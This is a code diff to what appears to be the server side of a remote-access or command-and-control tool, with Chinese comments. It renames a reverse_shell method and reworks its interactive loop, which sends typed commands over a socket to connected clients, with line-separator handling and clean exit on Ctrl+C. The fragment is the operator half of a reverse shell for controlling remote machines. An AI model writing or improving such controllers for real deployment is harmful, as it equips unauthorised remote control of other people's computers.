@@ -180,7 +180,7 @@ class Server:
             func = partial(conn.send_command, cmd)
         return func
 
-    def reverse_shell(self, cmd, conn, executor):
+    def revshell(self, cmd, conn, executor):
         """
         打开一个可完全交互的shell，支持stdin
         """
@@ -214,12 +214,22 @@ class Server:
         rev_con, addr = s.accept()
         print('Connection from {}'.format(addr))
         threading.Thread(target=recv).start()
+        # line_sep = None
+        if os.name == 'nt':
+            line_sep = '\r\n'
+        else:
+            line_sep='\n'
+
         while 1:
-            cmd = input()
-            if cmd in ['exit', 'quit']:
-                rev_con.send(bytes('exit\r\n', encoding='gbk'))
+            try:
+                cmd = input('>')  # 使用自定义提示符
+                if cmd.lower() in ['exit', 'quit']:
+                    rev_con.send(bytes('exit' + line_sep, encoding='gbk'))
+                    break
+                rev_con.send(bytes(cmd + line_sep, encoding='gbk'))
+            except (EOFError, KeyboardInterrupt):  # 处理 Ctrl+C / Ctrl+D
+                rev_con.send(bytes('exit' + line_sep, encoding='gbk'))
                 break
-            rev_con.send(bytes(cmd + '\r\n', encoding='gbk'))
 
     def open_connection(self, conn: Client):
         """
@@ -252,7 +262,7 @@ class Server:
                         self.open_connection(connection)
                         break
                     elif cmd == 'revshell':
-                        self.reverse_shell(cmd, conn, executor)
+                        self.revshell(cmd, conn, executor)
                         continue
 
                     func = self.process_command(cmd, conn, executor)
